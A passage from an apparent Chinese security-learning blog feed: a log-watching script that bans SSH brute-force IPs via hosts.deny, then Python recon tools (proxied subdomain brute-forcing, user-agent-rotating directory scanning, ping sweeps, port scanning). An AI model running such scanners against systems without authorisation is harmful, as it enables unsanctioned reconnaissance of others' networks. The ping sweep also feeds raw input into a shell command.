class="hljs-string">&#x27;Invalid user \w+ from (\d+\.\d+\.\d+\.\d+)&#x27;</span>,<span class="hljs-built_in">str</span>(line))<br>            <span class="hljs-comment">#不存在用户直接封</span><br>            <span class="hljs-keyword">if</span> group <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> deniedDict.get(group[<span class="hljs-number">1</span>]):<br>                subprocess.getoutput(<span class="hljs-string">&#x27;echo \&#x27;sshd:&#123;&#125;\&#x27; &gt;&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(group[<span class="hljs-number">1</span>],hostDeny))<br>                deniedDict[group[<span class="hljs-number">1</span>]] = <span class="hljs-string">&#x27;1&#x27;</span><br>                time_str = time.strftime(<span class="hljs-string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>,time.localtime(time.time()))<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#123;&#125; --- and ip:&#123;&#125; to hosts.deny for invalid usr&#x27;</span>.<span class="hljs-built_in">format</span>(time_str,group[<span class="hljs-number">1</span>]))<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-comment">#用户名合法 （存在该用户） 密码错误</span><br>            group = re.search(<span class="hljs-string">&#x27;Failed password for \w+ from (\d+\.\d+\.\d+\.\d+)&#x27;</span>,<span class="hljs-built_in">str</span>(line))<br>            <span class="hljs-keyword">if</span> group:<br>                ip = group[<span class="hljs-number">1</span>]<br>                <span class="hljs-comment">#统计ip错误的次数</span><br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> tempIp.get(ip):<br>                    tempIp[ip] = <span class="hljs-number">1</span><br>                <span class="hljs-keyword">else</span>:<br>                    tempIp[ip] = tempIp[ip]+<span class="hljs-number">1</span><br>                <span class="hljs-comment">#如果错误次数大于阈值，封禁该ip</span><br>                <span class="hljs-keyword">if</span> tempIp[ip] &gt; password_wrong_num <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> deniedDict.get(ip):<br>                    <span class="hljs-keyword">del</span> tempIp[ip]<br>                    subprocess.getoutput(<span class="hljs-string">&#x27;echo \&#x27;sshd:&#123;&#125;\&#x27; &gt;&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(ip,hostDeny))<br>                    deniedDict[ip]=<span class="hljs-string">&#x27;1&#x27;</span><br>                    time_str = time.strftime(<span class="hljs-string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>,time.localtime(time.time()))<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#123;&#125; --- and ip:&#123;&#125; to hosts.deny for invalid password&#x27;</span>.<span class="hljs-built_in">format</span>(time_str,group[<span class="hljs-number">1</span>]))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    monitorLog(logFile)<br></code></pre></td></tr></table></figure><p>其中group[1]即匹配到的ip</p><img src="/img/image-20230929155319929.png" alt="image-20230929155319929" style="zoom:67%;" /><p>靶机启动脚本：</p><p><img src="/img/image-20230905170317267.png" alt="image-20230905170317267"></p><p>攻击机执行爆破：</p><p><img src="/img/image-20230905170308672.png" alt="image-20230905170308672"></p><p><img src="/img/image-20230929160659881.png" alt="image-20230929160659881"></p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>pythonScript</title>
    <link href="/2023/09/22/pythonScript/"/>
    <url>/2023/09/22/pythonScript/</url>
    
    <content type="html"><![CDATA[<h1 id="pythonScript"><a href="#pythonScript" class="headerlink" title="pythonScript"></a>pythonScript</h1><p>菜鸡学习记录一下不同场景下的简单python脚本的编写 后续会继续优化 </p><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>文章中所有内容仅供学习交流，不得用于其他任何目的，文中敏感内容已做脱敏处理，严禁用于商业和非法用途，否则由此产生的一切后果与作者无关</p><h2 id="子域名扫描器"><a href="#子域名扫描器" class="headerlink" title="子域名扫描器"></a>子域名扫描器</h2><p>思路：1.拼接子域名  2.观察返回包是否为200</p><p>代理配置：<a href="https://www.kuaidaili.com/">https://www.kuaidaili.com/</a></p><p>爆破字典：<a href="https://github.com/TheKingOfDuck/fuzzDicts">https://github.com/TheKingOfDuck/fuzzDicts</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment"># 代理隧道域名:端口号  </span><br>tunnel = <span class="hljs-string">&quot;host:port&quot;</span><br><br><span class="hljs-comment"># 快代理使用用户名密码方式</span><br>username = <span class="hljs-string">&quot;xxx&quot;</span><br>password = <span class="hljs-string">&quot;xxx&quot;</span><br>proxies = &#123;<br>    <span class="hljs-string">&quot;http&quot;</span>: <span class="hljs-string">&quot;http://%(user)s:%(pwd)s@%(proxy)s/&quot;</span> % &#123;<span class="hljs-string">&quot;user&quot;</span>: username, <span class="hljs-string">&quot;pwd&quot;</span>: password, <span class="hljs-string">&quot;proxy&quot;</span>: tunnel&#125;,<br>    <span class="hljs-string">&quot;https&quot;</span>: <span class="hljs-string">&quot;http://%(user)s:%(pwd)s@%(proxy)s/&quot;</span> % &#123;<span class="hljs-string">&quot;user&quot;</span>: username, <span class="hljs-string">&quot;pwd&quot;</span>: password, <span class="hljs-string">&quot;proxy&quot;</span>: tunnel&#125;<br>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">domain_scan</span>(<span class="hljs-params">domain_name,sub_names</span>):<br>    <span class="hljs-keyword">for</span> sub <span class="hljs-keyword">in</span> sub_names:<br>        headers = &#123;<br>            <span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; hu; rv:1.8.0.11) Gecko/20070312 Firefox/1.5.0.11&quot;</span>,<br>        &#125;<br>        url = <span class="hljs-string">f&quot;https://<span class="hljs-subst">&#123;sub&#125;</span>.<span class="hljs-subst">&#123;domain_name&#125;</span>&quot;</span><br>        <span class="hljs-keyword">try</span>:<br>            requests.head = headers<br>            <span class="hljs-comment">#挂上代理</span><br>            requests.get(url,proxies=proxies)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*]<span class="hljs-subst">&#123;url&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">except</span> requests.ConnectionError:<br>            <span class="hljs-comment">#print(&quot;error&quot;)</span><br>            <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    dom_name = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;please enter the domain name:&quot;</span>)<br><br>    <span class="hljs-comment">#子域名文件路径 </span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/xxx/xxx/subdomain.txt&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>        sub_name = file.read()<br>        sub_dom = sub_name.splitlines()<br>        <span class="hljs-comment"># print(&quot;文件中存在的子域名数量：&#123;&#125;&quot;.format(len(sub_dom)))</span><br>        <span class="hljs-comment"># print(&quot;文件子域名列表&quot;)</span><br>        <span class="hljs-comment"># print(sub_dom)</span><br>        <br>    domain_scan(dom_name,sub_dom)<br></code></pre></td></tr></table></figure><h2 id="目录扫描器"><a href="#目录扫描器" class="headerlink" title="目录扫描器"></a>目录扫描器</h2><p>原理：1.拼接路径并请求   2.获取status_code，200则为成功 存在此目录</p><p>优化：加入面向对象 、多线程 、fake_useragent模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Queue<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">from</span> collections.abc <span class="hljs-keyword">import</span> <span class="hljs-type">Callable</span>,Iterable,Mapping<br><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Any</span><br><span class="hljs-keyword">from</span> fake_useragent <span class="hljs-keyword">import</span> UserAgent<br><span class="hljs-comment">#使用fake_useragent包导入随机UA头</span><br>random_UA = UserAgent()<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">DirScan</span>(threading.Thread):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,queue</span>):<br>        threading.Thread.__init__(self)<br>        self.queue = queue<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment">#获取队列中的url</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> self.queue.empty():<br>            url = self.queue.get()<br>            <br>            <span class="hljs-keyword">try</span>:<br>                headers = &#123;<br>                    <span class="hljs-string">&quot;User-Agent&quot;</span>:random_UA.random<br>                &#125;<br>                r = requests.get(url=url,headers=headers,timeout=<span class="hljs-number">2</span>)<br>                <span class="hljs-keyword">if</span> r.status_code == <span class="hljs-number">200</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] %s&#x27;</span> % url)<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-comment">#print(&quot;没有此路径&quot;)</span><br>                    <span class="hljs-keyword">pass</span><br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>(<span class="hljs-params">url,ext,count</span>):<br>    <span class="hljs-comment">#将待拼接的路径传入队列</span><br>    queue = Queue()<br>    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;%s.txt&#x27;</span> % ext,<span class="hljs-string">&#x27;r&#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f:<br>        queue.put(url+i.rstrip(<span class="hljs-string">&#x27;\n&#x27;</span>))    <br>    <br>    <span class="hljs-comment">#多线程</span><br>    threads = []<br>    thread_count = <span class="hljs-built_in">int</span>(count)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(thread_count):<br>        threads.append(DirScan(queue))<br>    <br>    <span class="hljs-comment">#开启线程</span><br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>        t.start()<br>    <br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>        t.join()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    url = <span class="hljs-string">&#x27;https://www.baidu.com&#x27;</span><br>    ext = <span class="hljs-string">&#x27;xxx&#x27;</span><br>    count = <span class="hljs-number">16</span><br>    start(url,ext,count)<br><br></code></pre></td></tr></table></figure><h2 id="C段扫描器"><a href="#C段扫描器" class="headerlink" title="C段扫描器"></a>C段扫描器</h2><p>原理：执行ping命令 是否有回显</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Queue<br><span class="hljs-keyword">from</span> subprocess <span class="hljs-keyword">import</span> Popen,PIPE<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">CScan</span>(threading.Thread):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,queue</span>):<br>        threading.Thread.__init__(self)<br>        self.queue = queue<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br><br>        <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> self.queue.empty():<br>            ip = self.queue.get()<br><br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-comment">#执行ping命令</span><br>                check_ping = Popen(<span class="hljs-string">&quot;ping &#123;0&#125; \n&quot;</span>.<span class="hljs-built_in">format</span>(ip),stdin=PIPE,stdout=PIPE,shell=<span class="hljs-literal">True</span>)<br>                data = check_ping.stdout.read()<br>                <span class="hljs-comment">#数据要转为str</span><br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;TTL&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(data):<br>                    <span class="hljs-built_in">print</span>(ip+<span class="hljs-string">&quot; id up!\n&quot;</span>)<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span>(ip+<span class="hljs-string">&quot; 不在线 \n&quot;</span>)<br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-keyword">pass</span><br><span class="hljs-comment">#多线程</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>(<span class="hljs-params">count,ip</span>):<br>    queue = Queue()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">255</span>):<br>        queue.put(ip+<span class="hljs-string">&#x27;.&#x27;</span>+<span class="hljs-built_in">str</span>(i))<br><br>    <span class="hljs-comment">#多线程</span><br>    threads = []<br>    thread_count = <span class="hljs-built_in">int</span>(count)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(thread_count):<br>        threads.append(CScan(queue))<br>    <span class="hljs-comment">#开启线程</span><br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>        t.start()<br>    <br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>        t.join()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    count = <span class="hljs-number">16</span><br>    ip = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入要扫描的ip段：&quot;</span>)<br>    start(count,ip)<br><br></code></pre></td></tr></table></figure><h2 id="端口扫描器"><a href="#端口扫描器" class="headerlink" title="端口扫描器"></a>端口扫描器</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-comment">#核心功能 待优化  结合C段扫描的功能</span><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_port_open</span>(<span class="hljs-params">host,port</span>):<br>    s = socket.socket()<br>    <span class="hljs-keyword">try</span>:<br>        s.connect((host,port))<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <br>host = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;enter the host:&quot;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#版本1  扫描C段的同时扫描存活主机的端口号</span><br><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Queue<br><span class="hljs-keyword">from</span> subprocess <span class="hljs-keyword">import</span> Popen,PIPE<br><br><span class="hljs-comment">#常见端口  自定义</span><br>common_port = [<span class="hljs-string">&#x27;21&#x27;</span>,<span class="hljs-string">&#x27;22&#x27;</span>,<span class="hljs-string">&#x27;80&#x27;</span>,<span class="hljs-string">&#x27;1433&#x27;</span>,<span class="hljs-string">&#x27;1521&#x27;</span>,<span class="hljs-string">&#x27;3306&#x27;</span>,<span class="hljs-string">&#x27;8080&#x27;</span>,<span class="hljs-string">&#x27;23&#x27;</span>,<span class="hljs-string">&#x27;25&#x27;</span>,<span class="hljs-string">&#x27;53&#x27;</span>,<span class="hljs-string">&#x27;137&#x27;</span>,<span class="hljs-string">&#x27;138&#x27;</span>,<span class="hljs-string">&#x27;139&#x27;</span>,<span class="hljs-string">&#x27;443&#x27;</span>,<span class="hljs-string">&#x27;7890&#x27;</span>]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_port_open</span>(<span class="hljs-params">host,port</span>):<br>    s = socket.socket()<br>    <span class="hljs-keyword">try</span>:<br>        s.connect((host,port))<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">CScan</span>(threading.Thread):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,queue</span>):<br>        threading.Thread.__init__(self)<br>        self.queue = queue<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br><br>        <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> self.queue.empty():<br>            ip = self.queue.get()<br><br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-comment">#执行ping命令</span><br>                check_ping = Popen(<span class="hljs-string">&quot;ping &#123;0&#125; \n&quot;</span>.<span class="hljs-built_in">format</span>(ip),stdin=PIPE,stdout=PIPE,shell=<span class="hljs-literal">True</span>)<br>                data = check_ping.stdout.read()<br>                <span class="hljs-comment">#数据要转为str</span><br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;TTL&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(data):<br>                    <span class="hljs-built_in">print</span>(ip+<span class="hljs-string">&quot; is up!\n&quot;</span>)<br>                    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> common_port:<br>                        <span class="hljs-keyword">if</span> is_port_open(ip,<span class="hljs-built_in">int</span>(p)):<br>                            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] &#x27;</span>+ip+<span class="hljs-string">&#x27;:&#x27;</span>+p+<span class="hljs-string">&quot; is open!&quot;</span>)<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span>(ip+<span class="hljs-string">&quot; 不在线 \n&quot;</span>)<br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>(<span class="hljs-params">count,ip</span>):<br>    queue = Queue()<br>    <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">255</span>):<br>        queue.put(ip+<span class="hljs-string">&#x27;.&#x27;</span>+<span class="hljs-built_in">str</span>(i))<br><br>    <span class="hljs-comment">#多线程</span><br>    threads = []<br>    thread_count = <span class="hljs-built_in">int</span>(count)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(thread_count):<br>        threads.append(CScan(queue))<br>    <br>    <span class="hljs-comment">#开启线程</span><br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>        t.start()<br>    <br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>        t.join()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    count = <span class="hljs-number">16</span><br>    ip = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入要扫描的ip段：&quot;</span>)<br>    start(count,ip)<br><br></code></pre></td></tr></table></figure><p>优化：</p><p>思路：</p><p>1.使用argparse模块  写成脚本形式</p><p>2.参数设置</p><p>-c  –Cduan  仅扫描输入ip的c段</p><p>-p  –port  仅扫描输入ip的端口号（默认使用常见端口测试）</p><p>-t  –target   指定目标</p><p>-a  –all   扫描输入的ip的C段并且扫描每个存活ip的端口开放情况</p><p>-ap –all_port  全端口扫描 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Queue<br><span class="hljs-keyword">from</span> subprocess <span class="hljs-keyword">import</span> Popen,PIPE<br><span class="hljs-keyword">from</span> argparse <span class="hljs-keyword">import</span> ArgumentParser<br><br><span class="hljs-comment">#常见端口  自定义</span><br>common_port = [<span class="hljs-number">21</span>,<span class="hljs-number">22</span>,<span class="hljs-number">80</span>,<span class="hljs-number">1433</span>,<span class="hljs-number">1521</span>,<span class="hljs-number">3306</span>,<span class="hljs-number">8080</span>,<span class="hljs-number">23</span>,<span class="hljs-number">25</span>,<span class="hljs-number">53</span>,<span class="hljs-number">137</span>,<span class="hljs-number">138</span>,<span class="hljs-number">139</span>,<span class="hljs-number">443</span>,<span class="hljs-number">7890</span>]<br><br><span class="hljs-comment">#端口扫描核心代码</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_port_open</span>(<span class="hljs-params">ip,port</span>):<br>    s = socket.socket()<br>    <span class="hljs-keyword">try</span>:<br>        s.connect((ip,port))<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">pScan</span>(threading.Thread):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,queue,args</span>):<br>        threading.Thread.__init__(self)<br>        self.queue = queue<br>        self.args = args<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>        args = self.args<br>        <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> self.queue.empty():<br>            ip = self.queue.get()<br>            <span class="hljs-keyword">try</span>:<br>                <span 